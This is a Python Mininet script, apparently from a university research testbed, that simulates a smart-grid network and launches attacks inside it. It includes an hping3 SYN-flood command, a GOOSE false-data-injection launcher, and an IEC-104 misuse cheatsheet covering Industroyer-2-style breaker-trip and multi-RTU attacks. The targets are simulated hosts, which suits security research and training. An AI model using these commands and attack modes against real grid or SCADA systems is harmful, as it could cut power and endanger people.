#!/usr/bin/python

from mininet.net import Mininet
from mininet.node import Controller, RemoteController, OVSController
from mininet.node import CPULimitedHost, Host, Node
from mininet.node import OVSKernelSwitch, UserSwitch
from mininet.node import IVSSwitch
from mininet.cli import CLI
from mininet.log import setLogLevel, info
from mininet.link import TCLink, Intf
from subprocess import call
import time
import argparse

RTU_COUNT = 2

def smartGridSimNetwork():

    net = Mininet( topo=None,
                   build=False,
                   ipBase='1.0.0.0/8')

    info( '\n*** ************************************* *** \n' )
    info( '*** Starting Smart Grid Simulation Model *** \n' )
    info( '*** Topology: 1xDPS + %dxDSS + Control Center \n' % RTU_COUNT )
    info( '*** Version: 250904 \n' )
    info( '*** Author: filip.holik@ntnu.no  \n' )
    info( '*** ************************************* *** \n' )
    info( '*** Adding controller\n' )
    c0=net.addController(name='c0',
                      controller=OVSController,
                      protocol='tcp',
                      port=6633)

    switchType = OVSKernelSwitch; 

    info( '*** Starting networking devices\n')
    DSS1GW = net.addSwitch('DSS1GW', cls=switchType, dpid='1',failMode='standalone')    
    DSS2GW = net.addSwitch('DSS2GW', cls=switchType, dpid='2',failMode='standalone')    
    WANR1 = net.addSwitch('WANR1', cls=switchType, dpid='3',failMode='standalone')
    WANR2 = net.addSwitch('WANR2', cls=switchType, dpid='4',failMode='standalone') 
    CONTROLSW = net.addSwitch('CONTROLSW', cls=switchType, dpid='5',failMode='standalone') 
    DPSGW = net.addSwitch('DPSGW', cls=switchType, dpid='6',failMode='standalone') 
    DPSRS = net.addSwitch('DPSRS', cls=switchType, dpid='7',failMode='standalone') 
    DPSHV = net.addSwitch('DPSHV', cls=switchType, dpid='8',failMode='standalone') 
    DPSMV = net.addSwitch('DPSMV', cls=switchType, dpid='9',failMode='standalone') 

    info( '*** Starting external connection\n')
    DSS1ASW = net.addSwitch('DSS1ASW', cls=switchType, dpid='10',failMode='standalone') 
    DSS2ASW = net.addSwitch('DSS2ASW', cls=switchType, dpid='11',failMode='standalone') 
    Intf( 'enp0s3', node=DSS1ASW )
    Intf( 'enp0s8', node=DSS2ASW )
    Intf( 'enp0s9', node=DPSHV )
    Intf( 'enp0s10', node=DPSGW )

    if RTU_COUNT >= 4:
        DSS3GW = net.addSwitch('DSS3GW', cls=switchType, dpid='12',failMode='standalone')
        DSS3ASW = net.addSwitch('DSS3ASW', cls=switchType, dpid='13',failMode='standalone')
        DSS4GW = net.addSwitch('DSS4GW', cls=switchType, dpid='14',failMode='standalone')
        DSS4ASW = net.addSwitch('DSS4ASW', cls=switchType, dpid='15',failMode='standalone')
        WANR3 = net.addSwitch('WANR3', cls=switchType, dpid='16',failMode='standalone')

    info( '*** Starting hosts \n')
    DSS1RTU = net.addHost('DSS1RTU', cls=Host, ip='1.1.1.1', defaultRoute='1.1.10.10',mac='b4:b1:5a:00:00:06')
    DSS2RTU = net.addHost('DSS2RTU', cls=Host, ip='1.1.2.1', defaultRoute='1.1.10.10',mac='b4:b1:5a:00:00:07')
    CONTROL = net.addHost('CONTROL', cls=Host, ip='1.1.10.10', defaultRoute='1.1.1.1',mac='00:02:B3:00:00:08')
    IED1 = net.addHost('IED1', cls=Host, ip='1.1.30.1', defaultRoute='1.1.10.10',mac='b4:b1:5a:0a:b4:01')
    IED2 = net.addHost('IED2', cls=Host, ip='1.1.30.2', defaultRoute='1.1.10.10',mac='b4:b1:5a:00:00:02')
    IED3 = net.addHost('IED3', cls=Host, ip='1.1.30.3', defaultRoute='1.1.10.10',mac='00:30:A7:00:00:03')
    IED4 = net.addHost('IED4', cls=Host, ip='1.1.30.4', defaultRoute='1.1.10.10',mac='00:30:A7:00:00:04')
    DPSHMI = net.addHost('DPSHMI', cls=Host, ip='1.1.30.10', defaultRoute='1.1.10.10',mac='00:80:BC:00:00:05')
    ATTACKER = net.addHost('ATTACKER', cls=Host, ip='1.1.30.66', defaultRoute='1.1.10.10',mac='00:06:5B:00:00:66')

    if RTU_COUNT >= 4:
        DSS3RTU = net.addHost('DSS3RTU', cls=Host, ip='1.1.3.1', defaultRoute='1.1.10.10',mac='b4:b1:5a:00:00:08')
        DSS4RTU = net.addHost('DSS4RTU', cls=Host, ip='1.1.4.1', defaultRoute='1.1.10.10',mac='b4:b1:5a:00:00:09')

    info( '*** Setting link parameters\n')
    #WAN1 = {'bw':1000,'delay':'20ms','loss':1,'jitter':'10ms'} 
    #GBPS = {'delay':'18ms'} 
    MBPS = {'bw':10} 

    info( '*** Adding links\n')
    net.addLink(WANR2, CONTROLSW)
    net.addLink(WANR1, CONTROLSW)
    net.addLink(CONTROLSW, CONTROL)
    net.addLink(WANR1, DSS1GW, cls=TCLink , **MBPS)
    net.addLink(WANR2, DSS2GW, cls=TCLink , **MBPS)

    if RTU_COUNT >= 4:
        net.addLink(WANR3, CONTROLSW)

    net.addLink(DPSGW, CONTROLSW)
    net.addLink(DPSGW, DPSRS)
    net.addLink(DPSRS, DPSHV)
    net.addLink(DPSRS, DPSMV)
    net.addLink(IED1, DPSHV)
    net.addLink(IED2, DPSHV)
    net.addLink(IED3, DPSMV)
    net.addLink(IED4, DPSMV)
    net.addLink(DPSHMI, DPSRS)

    net.addLink(DPSRS, ATTACKER)

    info( '*** Adding redundant links\n')
    #net.addLink(WANR2, DSS1GW, cls=TCLink , **GBPS)
    #net.addLink(WANR1, DSS2GW, cls=TCLink , **GBPS)
    #net.addLink(DSS1GW, DSS1RTU)
    #net.addLink(DSS2GW, DSS2RTU)

    info( '*** Adding links for external connections \n')
    net.addLink(DSS1RTU, DSS1ASW)
    net.addLink(DSS1ASW, DSS1GW)
    net.addLink(DSS2RTU, DSS2ASW)
    net.addLink(DSS2ASW, DSS2GW)

    if RTU_COUNT >= 4:
        net.addLink(WANR3, DSS3GW, cls=TCLink , **MBPS)
        net.addLink(WANR3, DSS4GW, cls=TCLink , **MBPS)
        net.addLink(DSS3RTU, DSS3ASW)
        net.addLink(DSS3ASW, DSS3GW)
        net.addLink(DSS4RTU, DSS4ASW)
        net.addLink(DSS4ASW, DSS4GW)

    info( '*** Starting network\n')
    net.build()
    info( '*** Starting controllers\n')
    for controller in net.controllers:
        controller.start()

    info( '*** Starting networking devices\n')
    net.get('DSS1GW').start([])
    net.get('DSS2GW').start([])
    net.get('WANR1').start([])
    net.get('WANR2').start([])
    net.get('CONTROLSW').start([])
    net.get('DSS1ASW').start([])
    net.get('DSS2ASW').start([])
    net.get('DPSGW').start([])
    net.get('DPSRS').start([])
    net.get('DPSHV').start([])
    net.get('DPSMV').start([])

    if RTU_COUNT >= 4:
        net.get('DSS3GW').start([])
        net.get('DSS3ASW').start([])
        net.get('DSS4GW').start([])
        net.get('DSS4ASW').start([])
        net.get('WANR3').start([])

    info( '*** Preparing custom scripts \n')
    CLI.do_sgsim_startcom_104 = sgsim_startcom_104
    CLI.do_sgsim_startcom_goose = sgsim_startcom_goose
    CLI.do_sgsim_startcom_sglab_goose = sgsim_startcom_sglab_goose
    CLI.do_sgsim_startcom_sv = sgsim_startcom_sv
    CLI.do_sgsim_startperfmon = sgsim_startperfmon
    CLI.do_sgsim_attackmirror = sgsim_attackmirror
    CLI.do_sgsim_attack_goose_fdi = sgsim_attack_goose_fdi
    CLI.do_sgsim_attack_dos = sgsim_attack_dos
    CLI.do_sgsim_attack_iec104_misuse = sgsim_attack_iec104_misuse
    CLI.do_sgsim_attack_iec104_help = sgsim_help_attack_iec104
    info( '*** Smart Grid Simulation Model Started *** \n' )
    CLI(net)

    net.stop()

def sgsim_startcom_goose(self, line):
    "Starts the GOOSE communication in the primary substation." 
    net = self.mn  
    info('Inserting rules for DPSGW switch... \n')
    net.get('DPSGW').cmdPrint('ovs-ofctl add-flow DPSGW dl_type=0x88b8,action=DROP')     # Simulation of GOOSE multicast 
    info('Starting GOOSE communication... \n')    
    net.get('IED1').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "IED1-GOOSE" -e "cd ../comlib_dps/sgdevices/IED_GOOSE/;./ied_goose IED1-eth0;bash"&') 
    time.sleep(0.5)
    net.get('IED4').cmdPrint('xterm -geometry 90x30+30+30 -fa "Monospace" -fs 12 -T "IED4-GOOSE" -e "cd ../comlib_dps/sgdevices/IED_GOOSE/;./ied_goose IED4-eth0;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "DPSHMI-GOOSE-1" -e "cd ../comlib_dps/sgdevices/DPSHMI_GOOSE/;./dpshmi 1;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+70+70 -fa "Monospace" -fs 12 -T "DPSHMI-GOOSE-4" -e "cd ../comlib_dps/sgdevices/DPSHMI_GOOSE/;./dpshmi 4;bash"&') 

def sgsim_startcom_sglab_goose(self, line):
    "Starts the GOOSE communication according to the SG LAB data." 
    net = self.mn  
    info('Inserting rules for DPSGW switch... \n')
    net.get('DPSGW').cmdPrint('ovs-ofctl add-flow DPSGW dl_type=0x88b8,action=DROP')     # Simulation of GOOSE multicast 
    info('Starting GOOSE communication... \n')    
    net.get('IED1').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "IED1-GOOSE" -e "cd ../comlib_dps/sgdevices/IED_GOOSE/;./ied_goose_sglab IED1-eth0;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "DPSHMI-GOOSE-1" -e "cd ../comlib_dps/sgdevices/DPSHMI_GOOSE/;./dpshmi;bash"&') 

def sgsim_attack_goose_fdi(self, line):
    "Starts the False Data Injection attack on GOOSE communication." 
    net = self.mn  
    info('Starting FDI attack... \n')    
    net.get('ATTACKER').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "ATTACKER-FDI" -e "cd ../comlib_dps/sgdevices/ATTACKER/;./fdi_goose ATTACKER-eth0;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "DPSHMI-GOOSE" -e "cd ../comlib_dps/sgdevices/DPSHMI_GOOSE/;./dpshmi;bash"&') 

def sgsim_attack_dos(self, line):
    "Starts the DoS attack from DSS1RTU on the control center." 
    net = self.mn  
    info('Starting DoS attack... \n')    
    net.get('DSS1RTU').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "ATTACKER-DOS" -e "sudo hping3 -S --flood 1.1.10.10;bash"&') 

def sgsim_startcom_sv(self, line):
    "Starts the SV communication in the primary substation." 
    net = self.mn  
    info('Inserting rules for DPSGW switch... \n')
    net.get('DPSGW').cmdPrint('ovs-ofctl add-flow DPSGW dl_type=0x88ba,action=DROP')     # Simulation of SV multicast 
    info('Starting SV communication... \n')    
    net.get('IED2').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "IED2-SV" -e "cd ../comlib_dps/sgdevices/IED_SV/;./ied_sv IED2-eth0;bash"&') 
    time.sleep(0.5)
    net.get('IED3').cmdPrint('xterm -geometry 90x30+30+30 -fa "Monospace" -fs 12 -T "IED3-SV" -e "cd ../comlib_dps/sgdevices/IED_SV/;./ied_sv IED3-eth0;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "DPSHMI-SV-2" -e "cd ../comlib_dps/sgdevices/DPSHMI_SV/;./dpshmi_sv 2;bash"&') 
    time.sleep(0.5)
    net.get('DPSHMI').cmdPrint('xterm -geometry 90x30+70+70 -fa "Monospace" -fs 12 -T "DPSHMI-SV-3" -e "cd ../comlib_dps/sgdevices/DPSHMI_SV/;./dpshmi_sv 3;bash"&') 
    time.sleep(0.5)

def sgsim_startcom_104(self, line):
    "Starts the IEC104 communication (periodical and read requests) for secondary substations." 
    net = self.mn   
    info('Starting IEC104 communication... \n')    
    info('Starting DSS1RTU communication... \n')    
    net.get('DSS1RTU').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "DSS1RTU" -e "cd ../comlib_dss/sgdevices/RTU/;./rtu 1.1.1.1;bash"&') 
    time.sleep(0.5)
    info('Starting DSS2RTU communication... \n')    
    net.get('DSS2RTU').cmdPrint('xterm -geometry 90x30+30+30 -fa "Monospace" -fs 12 -T "DSS2RTU" -e "cd ../comlib_dss/sgdevices/RTU/;./rtu 1.1.2.1;bash"&') 
    time.sleep(0.5)
    info('Starting CONTROL communication with DSS1... \n')    
    net.get('CONTROL').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "CONTROL - DSS1 Monitoring" -e "cd ../comlib_dss/sgdevices/CONTROL/;sleep 1;./control 1.1.1.1;bash"&') 
    time.sleep(0.5)
    info('Starting CONTROL communication with DSS2... \n')  
    net.get('CONTROL').cmdPrint('xterm -geometry 90x30+70+70 -fa "Monospace" -fs 12 -T "CONTROL - DSS2 Monitoring" -e "cd ../comlib_dss/sgdevices/CONTROL/;sleep 1;./control 1.1.2.1;bash"&')
    time.sleep(0.5)
    if RTU_COUNT >= 4:
        info('Starting DSS3RTU communication... \n')    
        net.get('DSS3RTU').cmdPrint('xterm -geometry 90x30+90+90 -fa "Monospace" -fs 12 -T "DSS3RTU" -e "cd ../comlib_dss/sgdevices/RTU/;./rtu 1.1.3.1;bash"&') 
        time.sleep(0.5)
        info('Starting DSS4RTU communication... \n')    
        net.get('DSS4RTU').cmdPrint('xterm -geometry 90x30+110+110 -fa "Monospace" -fs 12 -T "DSS4RTU" -e "cd ../comlib_dss/sgdevices/RTU/;./rtu 1.1.4.1;bash"&') 
        time.sleep(0.5)
        info('Starting CONTROL communication with DSS3... \n')  
        net.get('CONTROL').cmdPrint('xterm -geometry 90x30+130+130 -fa "Monospace" -fs 12 -T "CONTROL - DSS3 Monitoring" -e "cd ../comlib_dss/sgdevices/CONTROL/;sleep 1;./control 1.1.3.1;bash"&')
        time.sleep(0.5)
        info('Starting CONTROL communication with DSS4... \n')  
        net.get('CONTROL').cmdPrint('xterm -geometry 90x30+150+150 -fa "Monospace" -fs 12 -T "CONTROL - DSS4 Monitoring" -e "cd ../comlib_dss/sgdevices/CONTROL/;sleep 1;./control 1.1.4.1;bash"&')
    info('IEC104 communication started... \n(Please close all the opened windows before exiting the Mininet.)  \n')   

def sgsim_startperfmon(self, line):
    "Starts the IEC104 communication (periodical and read requests) with performance monitoring." 
    net = self.mn   
    info('Starting IEC104 communication with performance monitoring... \n')    
    info('Starting DSS1RTU communication... \n')    
    net.get('DSS1RTU').cmdPrint('xterm -geometry 90x30+10+10 -fa "Monospace" -fs 12 -T "DSS1RTU" -e "cd ../comlib_dss/sgdevices/PERFSEND/;./perfsend;bash"&') 
    time.sleep(0.5)
    info('Starting DSS2RTU communication... \n')    
    net.get('DSS2RTU').cmdPrint('xterm -geometry 90x30+30+30 -fa "Monospace" -fs 12 -T "DSS2RTU" -e "cd ../comlib_dss/sgdevices/PERFSEND/;./perfsend;bash"&') 
    time.sleep(0.5)
    info('Starting CONTROL communication with DSS1... \n')    
    net.get('CONTROL').cmdPrint('xterm -geometry 90x30+50+50 -fa "Monospace" -fs 12 -T "CONTROL - DSS1 Monitoring" -e "cd ../comlib_dss/sgdevices/PERFMON/;sleep 1;./perfmon 1.1.1.1;bash"&') 
    time.sleep(0.5)
    info('Starting CONTROL communication with DSS2... \n')  
    net.get('CONTROL').cmdPrint('xterm -geometry 90x30+70+70 -fa "Monospace" -fs 12 -T "CONTROL - DSS2 Monitoring" -e "cd ../comlib_dss/sgdevices/PERFMON/;sleep 1;./perfmon 1.1.2.1;bash"&')
    info('IEC104 communication with performance monitoring started... \n(Please close all the opened windows before exiting the Mininet.)  \n')   

def sgsim_attackmirror(self, line):
    "Makes DSS ASW devices to mirror traffic to external connections. "
    net = self.mn   
    info('Inserting rules for DSS1 switch... \n')    
    net.get('DSS1ASW').cmdPrint('ovs-ofctl add-flow DSS1ASW in_port:2,action=1,3; ovs-ofctl add-flow DSS1ASW in_port:3,action=1,2') 
    info('Inserting rules for DSS2 switch... \n')    
    net.get('DSS2ASW').cmdPrint('ovs-ofctl add-flow DSS2ASW in_port:2,action=1,3; ovs-ofctl add-flow DSS2ASW in_port:3,action=1,2') 

def sgsim_help_attack_iec104(self, line):
    "Show cheatsheet for the IEC-104 misuse tool."
    print("""
SGSim IEC-104 Misuse Tool
-------------------------

Launch the IEC-104 traffic generator from a Mininet node (CONTROL or ATTACKER).
The tool opens in its own xterm and generates protocol-valid IEC-60870-5-104 traffic.

SYNOPSIS
  sgsim_attack_iec104_misuse <src_node> <ip> [port] [mode] [rate_ms] [ioa_min] [ioa_max] [ca]

  Arguments marked with <> are REQUIRED.
  Arguments marked with [] are OPTIONAL (defaults shown below).

ARGUMENTS
  <src_node>  REQUIRED. Mininet node that sends the traffic.
              Must be CONTROL or ATTACKER.

  <ip>        REQUIRED. IP address of the target RTU.
              SGSim targets: DSS1RTU = 1.1.1.1 | DSS2RTU = 1.1.2.1

  [port]      TCP port the target RTU listens on.
              Default: 2404  (IEC-104 standard port)

  [mode]      Traffic / misuse pattern to run. See MODES below.
              Default: read_sweep

  [rate_ms]   Delay in milliseconds between successive operations.
              Lower = more aggressive. Higher = quieter/stealthier.
              Default: 250

  [ioa_min]   For read_sweep : lowest Information Object Address (IOA) in the sweep range.
              For single_cmd : the IOA the Single Command is sent to.
              For breaker_trip: the IOA the Double Command is sent to.
              Not used by conn_churn, start_stop, or interrogate.
              Default: 1

  [ioa_max]   Highest IOA for read_sweep. Requests loop from ioa_min up to ioa_max.
              NOT used by command modes (single_cmd, breaker_trip) -- set it equal
              to ioa_min or any value to keep the argument count correct.
              Default: 50

  [ca]        Common Address of ASDU (station address).
              Must match the address configured in the target RTU.
              Default: 1


MODES
  conn_churn
      Repeated TCP connections: connect -> STARTDT -> STOPDT -> close.
      Produces many short IEC-104 sessions.
      Useful for testing connection-state handling and session-storm resilience.
      Args used: ip, port, rate_ms

  start_stop
      Single connection with rapid STARTDT / STOPDT toggling.
      Creates abnormal protocol state transitions while remaining valid IEC-104.
      Args used: ip, port, rate_ms

  interrogate
      Repeated General Interrogation (GI) commands (C_IC_NA_1).
      Mimics station discovery / SCADA synchronisation at an abnormal rate.
      Args used: ip, port, rate_ms

  read_sweep
      Sequential read commands (C_RD_NA_1) across a range of IOAs.
      Simulates reconnaissance / asset enumeration.
      Args used: ip, port, rate_ms, ioa_min, ioa_max

  single_cmd
      Repeated C_SC_NA_1 Single Commands toggling ON / OFF at the target IOA.
      Represents Industroyer-style switch manipulation.
      IOA 5000 is the control point registered in the SGSim RTU model.
      Args used: ip, port, rate_ms, ioa_min, ca   (ioa_max is ignored)

  breaker_trip
      Repeated C_DC_NA_1 Double Commands OPEN / CLOSE at the target IOA.
      Represents the Industroyer-2 IEC-104 payload.
      Double Command is required for breakers because they have a transition state.
      IOA 5000 is the breaker control point registered in the SGSim RTU model.
      Args used: ip, port, rate_ms, ioa_min, ca   (ioa_max is ignored)

  industroyer2
      Multi-RTU sequential breaker attack (Industroyer-2 realistic).
      Accepts comma-separated IPs in the <ip> argument. Pivots RTU-by-RTU sequentially.
      Connects to each RTU in turn, sends STARTDT, walks through IOAs ioa_min..ioa_max
      sending C_DC_NA_1 OPEN (state=1) with rateMs delay between commands, then
      disconnects before moving to the next RTU.
      The attack does not loop — it exits after one pass through all RTUs.
      Args used: ip (comma-separated), port, rate_ms, ioa_min, ioa_max, ca


EXAMPLES

  Connection churn from attacker
      sgsim_attack_iec104_misuse ATTACKER 1.1.1.1 2404 conn_churn 200

  STARTDT / STOPDT abuse from control node
      sgsim_attack_iec104_misuse CONTROL 1.1.1.1 2404 start_stop 500

  General interrogation spam
      sgsim_attack_iec104_misuse ATTACKER 1.1.1.1 2404 interrogate 250

  IOA discovery sweep (IOA 1 to 100)
      sgsim_attack_iec104_misuse CONTROL 1.1.1.1 2404 read_sweep 200 1 100 1

  Industroyer-style single command toggle (IOA 5000, CA 1)
      sgsim_attack_iec104_misuse ATTACKER 1.1.1.1 2404 single_cmd 1000 5000 5000 1

  Industroyer-2 breaker trip / reset (IOA 5000, CA 1)
      sgsim_attack_iec104_misuse ATTACKER 1.1.1.1 2404 breaker_trip 1000 5000 5000 1

  Industroyer-2 realistic multi-RTU attack (IOAs 5000–5004, 3s between commands)
      sgsim_attack_iec104_misuse ATTACKER "1.1.1.1,1.1.2.1" 2404 industroyer2 3000 5000 5004 1

  NOTE: For single_cmd and breaker_trip, ioa_max must still be provided as a
  positional placeholder so that [ca] lands in the correct argument slot.
  Set ioa_max equal to ioa_min (e.g. 5000 5000) to make the intent clear.


IEC-104 COMMAND REFERENCE

  C_SC_NA_1 (TypeID 45)
      Single Command — binary ON / OFF control (switches, relays)

  C_DC_NA_1 (TypeID 46)
      Double Command — OPEN / CLOSE with transition state (circuit breakers)
      States: 0=not permitted, 1=OFF/OPEN (trip), 2=ON/CLOSE, 3=not permitted

  C_IC_NA_1 (TypeID 100)
      Interrogation Command — request full data snapshot from station

  C_RD_NA_1 (TypeID 102)
      Read Command — request value of a single IOA

  COT 6 (CS101_COT_ACTIVATION)
      Cause-of-Transmission used for control command requests

  IOA 5000
      Breaker / switch control point defined in the SGSim RTU (rtu.c asduHandler)


RATE GUIDANCE

  50 ms    aggressive / high-stress testing
  250 ms   moderate load (default)
  1000 ms  slow / low-noise experiment


STOP

  Press Ctrl+C inside the xterm window to terminate the tool.
""")

def sgsim_attack_iec104_misuse(self, line):
    """
    Run IEC-104 misuse tool from a chosen node (CONTROL or ATTACKER) in its own xterm.

    Usage:
      sgsim_attack_iec104_misuse <src_node> <ip> [port] [mode] [rate_ms] [ioa_min] [ioa_max] [ca]
    """
    net = self.mn
    args = line.strip().split()

    if len(args) < 2:
        print("Usage: sgsim_attack_iec104_misuse <src_node> <ip> [port] [mode] [rate_ms] [ioa_min] [ioa_max] [ca]")
        print("Tip:   sgsim_attack_iec104_help")
        return

    src = args[0].upper()
    target = args[1]
    port = args[2] if len(args) > 2 else "2404"
    mode = args[3] if len(args) > 3 else "read_sweep"
    rate = args[4] if len(args) > 4 else "250"
    ioa_min = args[5] if len(args) > 5 else "1"
    ioa_max = args[6] if len(args) > 6 else "50"
    ca = args[7] if len(args) > 7 else "1"

    if src not in ("CONTROL", "ATTACKER"):
        print("Error: src_node must be CONTROL or ATTACKER")
        return

    # Where your binary lives (relative to Mininet host's cwd in this repo layout)
    workdir = "../comlib_dss/sgdevices/ATTACKER"
    binary = "./attack_iec104_misuse"

    title = f"{src}-IEC104-MISUSE -> {target}:{port} {mode} {rate}ms"
    info(f"Starting IEC-104 misuse tool from {src} in xterm...\n")

    net.get(src).cmdPrint(
        'xterm -geometry 110x35+10+10 -fa "Monospace" -fs 12 '
        f'-T "{title}" -e '
        f'"cd {workdir} && {binary} {target} {port} {mode} {rate} {ioa_min} {ioa_max} {ca}; bash"&'
    )
    time.sleep(0.2)

if __name__ == '__main__':
    parser = argparse.ArgumentParser()
    parser.add_argument('--rtu-count', type=int, default=2)
    args, _ = parser.parse_known_args()
    RTU_COUNT = args.rtu_count
    setLogLevel( 'info' )
    smartGridSimNetwork()





